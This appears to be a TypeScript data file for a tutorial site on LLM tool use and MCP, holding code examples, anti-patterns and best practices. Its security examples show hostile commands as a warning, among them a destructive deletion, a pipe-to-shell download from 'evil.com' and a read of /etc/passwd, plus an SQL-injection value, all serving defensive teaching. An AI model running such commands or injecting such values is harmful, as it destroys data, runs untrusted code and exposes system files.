export interface Chapter {
  id: string;
  number: number;
  title: string;
  subtitle: string;
  icon: string;
}

export const chapters: Chapter[] = [
  {
    id: "tool-fundamentals",
    number: 1,
    title: "Tool Use Fundamentals",
    subtitle: "How LLMs call functions and use results",
    icon: "zap",
  },
  {
    id: "designing-tools",
    number: 2,
    title: "Designing Good Tools",
    subtitle: "Clear names, schemas, and descriptions",
    icon: "pencil-ruler",
  },
  {
    id: "mcp-intro",
    number: 3,
    title: "Model Context Protocol (MCP)",
    subtitle: "The standard for agent-tool communication",
    icon: "plug",
  },
  {
    id: "building-mcp-servers",
    number: 4,
    title: "Building MCP Servers",
    subtitle: "Create tools any MCP client can use",
    icon: "server",
  },
  {
    id: "tool-selection",
    number: 5,
    title: "Tool Selection & Routing",
    subtitle: "Dynamic tool loading for large registries",
    icon: "route",
  },
  {
    id: "error-handling",
    number: 6,
    title: "Error Handling & Retries",
    subtitle: "Graceful failure when tools break",
    icon: "shield-alert",
  },
  {
    id: "security",
    number: 7,
    title: "Security & Sandboxing",
    subtitle: "Safe tool execution in production",
    icon: "lock",
  },
  {
    id: "production-tools",
    number: 8,
    title: "Production Tool Architecture",
    subtitle: "Versioning, monitoring, and scaling tools",
    icon: "factory",
  },
  {
    id: "interactive-examples",
    number: 9,
    title: "Interactive Examples",
    subtitle: "See tool use patterns in action with live code",
    icon: "code",
  },
  {
    id: "anti-patterns",
    number: 10,
    title: "Anti-Patterns & Failure Modes",
    subtitle: "Tool soup, leaky tools, and how to avoid them",
    icon: "warning",
  },
  {
    id: "best-practices",
    number: 11,
    title: "Best Practices Checklist",
    subtitle: "Production-ready guidelines for tool use and MCP",
    icon: "check",
  },
  {
    id: "resources",
    number: 12,
    title: "Resources & Further Reading",
    subtitle: "Docs, specs, repos, and guides",
    icon: "book",
  },
];

export interface Quote {
  text: string;
  author: string;
  role: string;
}

export const quotes: Quote[] = [
  {
    text: "MCP is an open protocol that standardizes how applications provide context to LLMs. Think of MCP like a USB-C port for AI applications.",
    author: "David Soria Parra",
    role: "Creator of MCP, Anthropic",
  },
  {
    text: "By giving Claude access to tools, you can extend its capabilities far beyond text generation. Tools let Claude interact with external systems, fetch real-time data, and take actions in the world.",
    author: "Anthropic",
    role: "Tool Use Documentation",
  },
  {
    text: "The quality of your tools defines the ceiling of your agent's capabilities. A model can reason perfectly and still fail if its tools are poorly designed.",
    author: "Alex Albert",
    role: "Prompt Engineering Lead, Anthropic",
  },
];

export interface CodeExample {
  id: string;
  title: string;
  description: string;
  category: string;
  bad: {
    label: string;
    code: string;
    explanation: string;
  };
  good: {
    label: string;
    code: string;
    explanation: string;
  };
}

export const codeExamples: CodeExample[] = [
  {
    id: "tool-naming",
    title: "Tool Naming & Descriptions",
    description: "Clear names and descriptions are critical for tool selection",
    category: "Tool Design",
    bad: {
      label: "Vague names, no descriptions",
      code: `// BAD: Ambiguous tool names with no descriptions
const tools = [
  {
    name: "do_stuff",
    description: "Does stuff with the database",
    parameters: {
      type: "object",
      properties: {
        data: { type: "string" },
      },
    },
  },
  {
    name: "handle_request",
    description: "Handles a request",
    parameters: {
      type: "object",
      properties: {
        input: { type: "string" },
      },
    },
  },
];

// Model has no idea which tool to use or what "data" means
const response = await llm.generate({
  tools,
  messages: [{ role: "user", content: "Look up order #1234" }],
});`,
      explanation:
        "Vague names like 'do_stuff' and generic descriptions give the model no signal for when to use which tool. Parameter names like 'data' and 'input' don't communicate expected formats or constraints.",
    },
    good: {
      label: "Descriptive names with clear schemas",
      code: `// GOOD: Clear names, specific descriptions, typed parameters
const tools = [
  {
    name: "lookup_order",
    description:
      "Retrieves order details by order ID. Returns order status, " +
      "items, shipping info, and payment details. Use this when the " +
      "user asks about a specific order.",
    parameters: {
      type: "object",
      properties: {
        order_id: {
          type: "string",
          description: "The order ID, e.g. 'ORD-1234'",
          pattern: "^ORD-[0-9]+$",
        },
      },
      required: ["order_id"],
    },
  },
  {
    name: "search_orders",
    description:
      "Searches orders by customer email or date range. Use this " +
      "when the user wants to find orders but doesn't have an ID.",
    parameters: {
      type: "object",
      properties: {
        email: {
          type: "string",
          description: "Customer email to filter by",
        },
        date_from: {
          type: "string",
          description: "Start date in ISO 8601 format",
        },
        date_to: {
          type: "string",
          description: "End date in ISO 8601 format",
        },
      },
    },
  },
];`,
      explanation:
        "Each tool has a verb_noun name that communicates its action. Descriptions explain what the tool returns and when to use it. Parameters have types, descriptions, and patterns. The model can confidently choose the right tool.",
    },
  },
  {
    id: "tool-output",
    title: "Tool Output Design",
    description: "What your tools return goes directly into the context window",
    category: "Token Efficiency",
    bad: {
      label: "Dump raw API response",
      code: `// BAD: Return entire raw API response
async function getUser(userId: string) {
  const response = await fetch(\`/api/users/\${userId}\`);
  const data = await response.json();

  // Returns EVERYTHING: metadata, timestamps, internal IDs,
  // audit logs, related entities, pagination info...
  return data; // 2,000+ tokens of mostly irrelevant data
}

// Tool result injected into context:
// { "id": "usr_abc123", "created_at": "2024-01-15T...",
//   "updated_at": "2024-06-20T...", "internal_flags": [...],
//   "audit_log": [...50 entries...], "metadata": {...},
//   "preferences": {...}, "sessions": [...], ... }`,
      explanation:
        "Raw API responses contain internal IDs, audit logs, metadata, and other fields the model doesn't need. This wastes context tokens and can confuse the model with irrelevant information. Every token in a tool response competes for attention.",
    },
    good: {
      label: "Return structured, minimal response",
      code: `// GOOD: Return only what the model needs
async function getUser(userId: string) {
  const response = await fetch(\`/api/users/\${userId}\`);
  const data = await response.json();

  // Extract only relevant fields for the model
  return {
    name: data.name,
    email: data.email,
    plan: data.subscription?.plan ?? "free",
    status: data.status,
    created: data.created_at?.split("T")[0], // Just the date
    recent_orders: data.orders
      ?.slice(0, 3)
      .map((order: { id: string; total: number; status: string }) => ({
        id: order.id,
        total: order.total,
        status: order.status,
      })),
  };
}

// Tool result: ~120 tokens instead of 2,000+
// { "name": "Jane Doe", "email": "jane@example.com",
//   "plan": "pro", "status": "active", "created": "2024-01-15",
//   "recent_orders": [{"id":"ORD-1","total":99,"status":"shipped"}] }`,
      explanation:
        "Filter tool outputs to only the fields the model needs to answer the user's question. This reduces context consumption by 90%+ and helps the model focus on relevant data. Flatten nested structures and truncate lists.",
    },
  },
  {
    id: "schema-validation",
    title: "Schema Validation with Zod",
    description: "Validate tool inputs and outputs at runtime",
    category: "Reliability",
    bad: {
      label: "No validation — trust the model blindly",
      code: `// BAD: No validation on tool inputs
async function createInvoice(params: Record<string, unknown>) {
  // Model might send wrong types, missing fields, or
  // malicious values — we just pass it through
  const result = await db.invoices.create({
    customer_id: params.customer_id as string,
    amount: params.amount as number, // Could be negative!
    currency: params.currency as string, // Could be "FAKE"
    items: params.items as unknown[], // Could be anything
  });

  return result;
}

// What if the model sends:
// { amount: -500, currency: "DROP TABLE invoices;--" }`,
      explanation:
        "Without validation, the model can send malformed data, wrong types, or values outside expected ranges. This can cause database errors, security vulnerabilities, or silent data corruption. LLMs are creative — they will find edge cases.",
    },
    good: {
      label: "Zod schemas validate everything",
      code: `// GOOD: Zod validates inputs before execution
import { z } from "zod";

const CreateInvoiceSchema = z.object({
  customer_id: z.string().uuid("Must be a valid UUID"),
  amount: z.number().positive("Amount must be positive").max(100_000),
  currency: z.enum(["USD", "EUR", "GBP"]),
  items: z
    .array(
      z.object({
        description: z.string().min(1).max(200),
        quantity: z.number().int().positive(),
        unit_price: z.number().positive(),
      }),
    )
    .min(1, "At least one item required")
    .max(50),
});

type CreateInvoiceInput = z.infer<typeof CreateInvoiceSchema>;

async function createInvoice(rawParams: unknown) {
  // Parse and validate — throws ZodError with details
  const params = CreateInvoiceSchema.parse(rawParams);

  // params is now fully typed and validated
  const result = await db.invoices.create(params);

  return { invoice_id: result.id, status: "created" };
}`,
      explanation:
        "Zod validates every field at runtime: UUIDs are real UUIDs, amounts are positive, currencies are from an allowed list, arrays have bounds. If the model sends invalid data, you get a clear error message instead of silent corruption.",
    },
  },
  {
    id: "mcp-server",
    title: "MCP Server Implementation",
    description: "Building an MCP server with the TypeScript SDK",
    category: "MCP",
    bad: {
      label: "Ad-hoc tool server with no protocol",
      code: `// BAD: Custom tool server — every client needs custom integration
import express from "express";

const app = express();

app.post("/tools/search", (req, res) => {
  // Custom endpoint per tool
  // No schema discovery
  // No standard error format
  // Every AI client needs custom code to use this
  const results = searchDatabase(req.body.query);
  res.json(results);
});

app.post("/tools/create-ticket", (req, res) => {
  const ticket = createTicket(req.body);
  res.json(ticket);
});

// Client code needs to know every endpoint, every schema,
// every error format — nothing is discoverable
app.listen(3000);`,
      explanation:
        "Custom REST endpoints require every AI client to write bespoke integration code. There's no schema discovery, no standard error format, no capability negotiation. Each new client means writing another integration from scratch.",
    },
    good: {
      label: "Standard MCP server — any client works",
      code: `// GOOD: MCP server — works with Claude, Cursor, Zed, etc.
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { z } from "zod";

const server = new McpServer({
  name: "ticketing-server",
  version: "1.0.0",
});

// Tools are self-describing with schemas
server.tool(
  "search_tickets",
  "Search support tickets by status, assignee, or keyword",
  {
    query: z.string().describe("Search query"),
    status: z.enum(["open", "closed", "pending"]).optional(),
    limit: z.number().int().min(1).max(50).default(10),
  },
  async ({ query, status, limit }) => {
    const results = await searchTickets({ query, status, limit });
    return {
      content: [
        {
          type: "text" as const,
          text: JSON.stringify(results, null, 2),
        },
      ],
    };
  },
);

// Any MCP client can discover and use these tools
const transport = new StdioServerTransport();
await server.connect(transport);`,
      explanation:
        "MCP servers expose self-describing tools with Zod schemas. Any MCP-compatible client (Claude Desktop, Cursor, Zed, custom apps) can discover available tools, understand their schemas, and call them — no custom integration needed.",
    },
  },
  {
    id: "error-handling",
    title: "Tool Error Handling",
    description: "Design errors that help the model recover",
    category: "Reliability",
    bad: {
      label: "Throw raw errors — model gets stack traces",
      code: `// BAD: Raw errors leak into context
async function queryDatabase(sql: string) {
  try {
    return await db.execute(sql);
  } catch (error) {
    // This stack trace goes into the model's context:
    // "Error: relation \\"users\\" does not exist
    //  at Object.query (node_modules/pg/lib/client.js:534:17)
    //  at processTicksAndRejections (node:internal/process/
    //  task_queues:95:5)
    //  at async queryDatabase (/app/tools/db.ts:12:10)"
    throw error;
  }
}

// Model sees a stack trace and tries to "fix" the code
// or hallucinates database schema details`,
      explanation:
        "Raw stack traces consume tokens, expose internal implementation details, and confuse the model. The model might try to 'fix' code paths it can see in the trace, or hallucinate based on file paths and library internals.",
    },
    good: {
      label: "Structured errors with recovery hints",
      code: `// GOOD: Structured error responses the model can act on
interface ToolError {
  error: true;
  code: string;
  message: string;
  recoverable: boolean;
  suggestion?: string;
}

async function queryDatabase(sql: string): Promise<unknown | ToolError> {
  try {
    return await db.execute(sql);
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);

    if (message.includes("does not exist")) {
      return {
        error: true,
        code: "TABLE_NOT_FOUND",
        message: "The requested table does not exist.",
        recoverable: true,
        suggestion:
          "Available tables: users, orders, products, tickets. " +
          "Check the table name and try again.",
      };
    }

    if (message.includes("permission denied")) {
      return {
        error: true,
        code: "PERMISSION_DENIED",
        message: "You do not have permission to access this resource.",
        recoverable: false,
      };
    }

    return {
      error: true,
      code: "QUERY_FAILED",
      message: "The database query failed. Please simplify your query.",
      recoverable: true,
      suggestion: "Try querying a single table with simple conditions.",
    };
  }
}`,
      explanation:
        "Structured errors give the model actionable information: an error code for classification, a human-readable message, whether it can retry, and a specific suggestion for recovery. No stack traces, no internal details — just what the model needs to try again.",
    },
  },
  {
    id: "tool-selection",
    title: "Dynamic Tool Selection",
    description: "Load only the tools relevant to the current task",
    category: "Tool Selection",
    bad: {
      label: "Load all 50+ tools for every request",
      code: `// BAD: Every request gets every tool
const ALL_TOOLS = [
  searchUsers, findUser, lookupAccount,  // Overlapping!
  createTicket, updateTicket, deleteTicket,
  sendEmail, sendSlack, sendSMS,
  queryDatabase, runSQL, searchRecords,  // Overlapping!
  getMetrics, generateReport, exportCSV,
  processPayment, issueRefund, updateBilling,
  // ... 30+ more tools
];

async function handleRequest(message: string) {
  // Model sees 50+ tool definitions (~8K tokens)
  // With overlapping tools, it picks the wrong one 40% of time
  const response = await llm.generate({
    tools: ALL_TOOLS,
    messages: [{ role: "user", content: message }],
  });
  return response;
}`,
      explanation:
        "Loading all tools wastes context tokens on definitions the model doesn't need. Overlapping tools (searchUsers vs findUser vs lookupAccount) confuse the model. Research shows tool selection accuracy drops from 95% to 30% as tool count grows from 10 to 50+.",
    },
    good: {
      label: "RAG over tool descriptions for dynamic selection",
      code: `// GOOD: Select tools relevant to the current task
import { embed } from "./embeddings";

interface ToolMeta {
  tool: Tool;
  embedding: number[];
  category: string;
}

const toolIndex: ToolMeta[] = await indexAllTools();

async function selectTools(
  userMessage: string,
  maxTools = 8,
): Promise<Tool[]> {
  const queryEmbed = await embed(userMessage);

  // Score each tool by relevance to the query
  const scored = toolIndex
    .map((meta) => ({
      tool: meta.tool,
      score: cosineSimilarity(queryEmbed, meta.embedding),
    }))
    .sort((a, b) => b.score - a.score)
    .filter((item) => item.score > 0.6);

  // Deduplicate by category — keep best per category
  const seen = new Set<string>();
  const selected: Tool[] = [];
  for (const item of scored) {
    const cat = toolIndex.find(
      (t) => t.tool === item.tool,
    )?.category;
    if (cat && !seen.has(cat)) {
      seen.add(cat);
      selected.push(item.tool);
    }
    if (selected.length >= maxTools) break;
  }

  return selected;
}

// At runtime: only 5-8 relevant tools per request
async function handleRequest(message: string) {
  const tools = await selectTools(message);
  return llm.generate({ tools, messages: [{ role: "user", content: message }] });
}`,
      explanation:
        "Embed tool descriptions in a vector index. For each request, find the most relevant tools via cosine similarity. Deduplicate by category to prevent overlapping tools. The model sees 5-8 focused tools instead of 50+, improving selection accuracy by 3x.",
    },
  },
  {
    id: "security-sandbox",
    title: "Tool Execution Sandboxing",
    description: "Isolate tool execution to prevent damage",
    category: "Security",
    bad: {
      label: "Execute tool calls with full permissions",
      code: `// BAD: Tool runs with app's full permissions
async function executeShellCommand(command: string) {
  // No validation, no sandboxing, no limits
  const result = await exec(command);
  return result.stdout;
}

// Model could call:
// executeShellCommand("rm -rf /")
// executeShellCommand("curl http://evil.com | bash")
// executeShellCommand("cat /etc/passwd")`,
      explanation:
        "Running tool calls with the application's full permissions is extremely dangerous. The model might execute destructive commands, exfiltrate data, or run arbitrary code. This is the #1 security risk in tool-using agents.",
    },
    good: {
      label: "Validate, scope, and sandbox execution",
      code: `// GOOD: Validate, allowlist, and sandbox tool execution
const ALLOWED_COMMANDS = new Set([
  "ls", "cat", "head", "grep", "wc", "find",
]);

const BLOCKED_PATHS = ["/etc", "/var", "/root", "/home"];

async function executeShellCommand(rawCommand: string) {
  // 1. Parse and validate the command
  const parts = rawCommand.split(/\\s+/);
  const binary = parts[0];

  if (!ALLOWED_COMMANDS.has(binary)) {
    return {
      error: true,
      message: \`Command '\${binary}' is not allowed. \\
Allowed: \${[...ALLOWED_COMMANDS].join(", ")}\`,
    };
  }

  // 2. Check for blocked paths
  const hasBlockedPath = parts.some((part) =>
    BLOCKED_PATHS.some((blocked) => part.startsWith(blocked)),
  );
  if (hasBlockedPath) {
    return {
      error: true,
      message: "Access to system directories is not permitted.",
    };
  }

  // 3. Execute in sandbox with resource limits
  const result = await execInSandbox(rawCommand, {
    timeout: 10_000,        // 10 second max
    maxMemory: "256mb",     // Memory limit
    cwd: "/app/workspace",  // Restricted working directory
    uid: SANDBOX_USER_ID,   // Unprivileged user
  });

  return { stdout: result.stdout.slice(0, 5_000) }; // Truncate output
}`,
      explanation:
        "Defense in depth: allowlist permitted commands, block sensitive paths, execute in a sandboxed environment with resource limits (timeout, memory, unprivileged user), and truncate output. Each layer prevents a different class of attack.",
    },
  },
];

export interface AntiPattern {
  name: string;
  icon: string;
  description: string;
  cause: string;
  symptom: string;
  fix: string;
  severity: "critical" | "high" | "medium";
}

export const antiPatterns: AntiPattern[] = [
  {
    name: "Tool Sprawl",
    icon: "sprawl",
    description:
      "Registering dozens of tools with overlapping functionality, forcing the model to choose between near-identical options.",
    cause:
      "Adding tools incrementally without auditing for overlap. Three tools that all 'search records' — searchDB, querySQL, findRecords — each with slightly different schemas.",
    symptom:
      "Model picks the wrong tool 40%+ of the time. Wastes tokens deliberating between similar options. Tool call chains become unpredictable. Research shows accuracy drops from 95% to 30% going from 10 to 50 tools.",
    fix: "Audit your tool registry for overlaps. Merge similar tools into one with optional parameters. Keep under 15 tools per task context. Use dynamic tool selection (RAG over tool descriptions) for large registries.",
    severity: "critical",
  },
  {
    name: "Schema Ambiguity",
    icon: "ambiguity",
    description:
      "Tool parameters with vague names, missing descriptions, or no type constraints, leaving the model to guess the correct format.",
    cause:
      "Lazy parameter naming (data, input, params) with no descriptions. Missing required/optional distinctions. No examples of valid values.",
    symptom:
      "Model sends wrong parameter types (string instead of number), invents parameter names, or formats values incorrectly. Tool calls fail silently or produce unexpected results.",
    fix: "Use Zod or JSON Schema for every parameter. Add descriptions with examples. Mark required fields. Add patterns/enums for constrained values. If a human can't figure out the parameter format from the schema alone, the model can't either.",
    severity: "critical",
  },
  {
    name: "Result Bloat",
    icon: "bloat",
    description:
      "Tools return entire API responses — metadata, pagination, internal IDs, audit logs — consuming thousands of context tokens with irrelevant data.",
    cause:
      "Passing through raw API responses without filtering. Returning full database rows instead of relevant fields. No truncation on list results.",
    symptom:
      "Context window fills up fast. Model gets confused by irrelevant fields. Important information is buried in noise. Token costs increase dramatically with no quality improvement.",
    fix: "Filter tool outputs to only fields the model needs. Truncate lists (return top 5, not all 500). Flatten nested structures. Remove internal IDs, timestamps, and metadata the model won't use. Aim for 90%+ reduction in raw response size.",
    severity: "high",
  },
  {
    name: "Silent Failures",
    icon: "silent",
    description:
      "Tools fail without returning actionable error information, leaving the model unable to recover or explain what went wrong.",
    cause:
      "Catching exceptions and returning null, empty strings, or generic 'error occurred' messages. Swallowing errors to avoid 'messy' responses.",
    symptom:
      "Model hallucinates results when it receives null. Makes up data to fill gaps. Retries the same failing call indefinitely. User gets confident-sounding wrong answers because the model doesn't know the tool failed.",
    fix: "Return structured error objects with: error code, human-readable message, whether the error is recoverable, and a specific suggestion for what to try next. Never return null — always return an explicit error or success.",
    severity: "high",
  },
  {
    name: "Permission Creep",
    icon: "creep",
    description:
      "Tools operate with the application's full permissions — database admin, file system access, network access — instead of scoped, minimal privileges.",
    cause:
      "Using the same database connection, API keys, and service accounts for tool execution as for the main application. No sandboxing layer between the model and system resources.",
    symptom:
      "A single prompt injection or model hallucination can delete data, read sensitive files, or exfiltrate information. Security audit reveals tools have access to resources they never need.",
    fix: "Apply the principle of least privilege: create read-only database views for read tools, separate API keys with minimal scopes, sandbox file system access to a working directory, set resource limits (timeout, memory), and audit tool permissions regularly.",
    severity: "critical",
  },
  {
    name: "Hallucinated Tool Calls",
    icon: "hallucinate",
    description:
      "The model invents tool names, parameters, or call patterns that don't exist in the provided tool definitions.",
    cause:
      "Tool names that are too similar to common patterns the model has seen in training data. Insufficient grounding in the tool schema. No validation layer between the model's output and tool execution.",
    symptom:
      "Model calls tools that don't exist (e.g., 'send_message' when only 'send_email' is defined). Invents parameters not in the schema. Attempts multi-step tool patterns it saw in training but aren't supported.",
    fix: "Validate every tool call against the registered schema before execution. Return clear 'tool not found' errors with the list of available tools. Use unique, specific tool names that are unlikely to be confused with training data patterns.",
    severity: "high",
  },
];

export interface BestPractice {
  category: string;
  items: { title: string; description: string }[];
}

export const bestPractices: BestPractice[] = [
  {
    category: "Tool Design Principles",
    items: [
      {
        title: "One tool, one action",
        description:
          "Each tool should do exactly one thing. A 'manage_user' tool that creates, updates, and deletes is harder for the model to use correctly than separate create_user, update_user, and delete_user tools.",
      },
      {
        title: "Use verb_noun naming",
        description:
          "Name tools as verb_noun: search_orders, create_ticket, get_user. This instantly communicates the action and target. Avoid generic names like 'handle' or 'process'.",
      },
      {
        title: "Write descriptions for the model, not humans",
        description:
          "Tool descriptions are part of the model's context. Include when to use the tool, what it returns, and edge cases. 'Searches orders by email or date range. Use when user wants to find orders but doesn't have an order ID.'",
      },
      {
        title: "Validate with Zod at the boundary",
        description:
          "Parse and validate every tool input with Zod before execution. This catches type errors, missing fields, and out-of-range values before they cause downstream failures.",
      },
    ],
  },
  {
    category: "MCP Best Practices",
    items: [
      {
        title: "Keep servers focused and composable",
        description:
          "Build small, single-purpose MCP servers (one for GitHub, one for Jira, one for databases) rather than monolithic servers. Clients can compose multiple servers as needed.",
      },
      {
        title: "Version your server protocol",
        description:
          "Include version in your server's capabilities. When you add or change tools, increment the version so clients can detect incompatibilities.",
      },
      {
        title: "Use resources for read-heavy data",
        description:
          "MCP resources (file://, db://) are better than tools for data the client reads frequently. Resources can be cached and subscribed to, while tool calls always execute.",
      },
      {
        title: "Test with the MCP Inspector",
        description:
          "Use the official MCP Inspector tool to test your server independently before connecting to a client. It validates protocol compliance, schema correctness, and error handling.",
      },
    ],
  },
  {
    category: "Error Handling & Reliability",
    items: [
      {
        title: "Never return null — always return structured results",
        description:
          "Return explicit success or error objects from every tool. A null return causes the model to hallucinate results. An error object tells the model exactly what went wrong and how to recover.",
      },
      {
        title: "Include recovery suggestions in errors",
        description:
          "When a tool fails, return what the model should try next: 'Table not found. Available tables: users, orders, products.' This turns errors into learning opportunities.",
      },
      {
        title: "Implement idempotent retries",
        description:
          "Design write operations to be idempotent so the model can safely retry on failure. Use unique request IDs to prevent duplicate actions.",
      },
      {
        title: "Set timeouts on every tool call",
        description:
          "A tool that hangs blocks the entire agent loop. Set aggressive timeouts (5-30 seconds) and return a timeout error the model can handle, rather than waiting indefinitely.",
      },
    ],
  },
  {
    category: "Security & Production",
    items: [
      {
        title: "Apply least privilege to every tool",
        description:
          "Tools should have the minimum permissions needed. Read-only tools get read-only database access. File tools are restricted to a working directory. API keys have minimal scopes.",
      },
      {
        title: "Validate and sanitize all tool inputs",
        description:
          "Never pass model-generated strings directly to system commands, SQL queries, or file paths. Validate with schemas, use parameterized queries, and sanitize file paths.",
      },
      {
        title: "Log every tool call for audit",
        description:
          "Record the tool name, input parameters, output, duration, and caller for every tool execution. This is essential for debugging, cost tracking, and security auditing.",
      },
      {
        title: "Require human approval for destructive actions",
        description:
          "Tools that delete data, send messages, make payments, or modify infrastructure should require explicit human confirmation before execution. Never auto-approve irreversible actions.",
      },
    ],
  },
  {
    category: "Tool Selection & Routing",
    items: [
      {
        title: "Keep active tool sets under 15 per request",
        description:
          "Research shows tool selection accuracy drops significantly beyond 20 tools. Use dynamic selection via RAG to keep the active set small while supporting large registries.",
      },
      {
        title: "Index tool descriptions for semantic search",
        description:
          "Embed tool names and descriptions in a vector database. When a request arrives, find the top-k most relevant tools. This scales to hundreds of tools while keeping per-request context small.",
      },
      {
        title: "Use tool categories for coarse routing",
        description:
          "Group tools by domain (billing, search, admin). Route to a category first based on intent classification, then do fine-grained tool selection within that category.",
      },
      {
        title: "Build evals for tool selection accuracy",
        description:
          "Create test suites that verify the model picks the correct tool for known queries. Track selection accuracy as a metric. Regression test when adding new tools to catch description conflicts.",
      },
    ],
  },
];

export interface Resource {
  title: string;
  url: string;
  type: "blog" | "paper" | "repo" | "video" | "guide" | "docs";
  source: string;
  description: string;
}

export const resources: Resource[] = [
  {
    title: "Tool Use with Claude — Anthropic Documentation",
    url: "https://docs.anthropic.com/en/docs/build-with-claude/tool-use/overview",
    type: "guide",
    source: "Anthropic",
    description:
      "Official documentation on Claude's tool use capabilities including function calling, parallel tool calls, and streaming tool results.",
  },
  {
    title: "Model Context Protocol — Official Documentation",
    url: "https://modelcontextprotocol.io/introduction",
    type: "guide",
    source: "MCP",
    description:
      "The official MCP specification, quickstart guides, and architecture overview. The definitive reference for building MCP servers and clients.",
  },
  {
    title: "Model Context Protocol TypeScript SDK",
    url: "https://github.com/modelcontextprotocol/typescript-sdk",
    type: "repo",
    source: "GitHub",
    description:
      "Official TypeScript SDK for building MCP servers and clients. Includes server framework, transport implementations, and examples.",
  },
  {
    title: "Introducing the Model Context Protocol",
    url: "https://www.anthropic.com/news/model-context-protocol",
    type: "blog",
    source: "Anthropic",
    description:
      "Anthropic's announcement of MCP: why it was created, the problem it solves, and the vision for a universal tool standard.",
  },
  {
    title: "MCP Servers — Community Directory",
    url: "https://github.com/modelcontextprotocol/servers",
    type: "repo",
    source: "GitHub",
    description:
      "Official and community-built MCP servers for GitHub, Slack, PostgreSQL, filesystem, and dozens more integrations.",
  },
  {
    title: "Gorilla: Large Language Model Connected with Massive APIs",
    url: "https://arxiv.org/abs/2305.15334",
    type: "paper",
    source: "arXiv / UC Berkeley",
    description:
      "Research on training LLMs to accurately use tools from large API registries. Key findings on tool selection accuracy degradation with scale.",
  },
  {
    title: "Toolformer: Language Models Can Teach Themselves to Use Tools",
    url: "https://arxiv.org/abs/2302.04761",
    type: "paper",
    source: "arXiv / Meta",
    description:
      "Foundational paper on how language models learn to use tools. Demonstrates self-supervised approaches to tool use learning.",
  },
  {
    title: "Building Effective Agents — Anthropic",
    url: "https://www.anthropic.com/engineering/building-effective-agents",
    type: "blog",
    source: "Anthropic",
    description:
      "Comprehensive guide to building production agents, including tool design principles, orchestration patterns, and common failure modes.",
  },
  {
    title: "Function Calling — OpenAI Documentation",
    url: "https://platform.openai.com/docs/guides/function-calling",
    type: "guide",
    source: "OpenAI",
    description:
      "OpenAI's approach to function calling, useful for understanding cross-platform tool design patterns and the JSON Schema specification.",
  },
  {
    title: "MCP Inspector — Testing Tool",
    url: "https://github.com/modelcontextprotocol/inspector",
    type: "repo",
    source: "GitHub",
    description:
      "Official tool for testing MCP servers interactively. Validates protocol compliance, tests tool schemas, and debugs server behavior.",
  },
];
